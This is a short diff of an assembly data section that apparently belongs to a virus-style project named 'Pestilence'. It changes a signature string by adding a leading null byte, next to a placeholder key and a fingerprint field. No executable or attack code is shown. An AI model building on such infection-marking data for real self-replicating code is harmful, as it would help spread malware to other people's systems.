@@ -49,7 +49,7 @@ dataearly:
 ;0
 key: db `KEY000000000KEY\0`
 ;2
-signature: db `Pestilence version 1.0 (c)oded by ndombre-agadhgad-`
+signature: db `\0Pestilence version 1.0 (c)oded by ndombre-agadhgad-`
 fingerprint: db `AAAAAAAA`,0
 
 
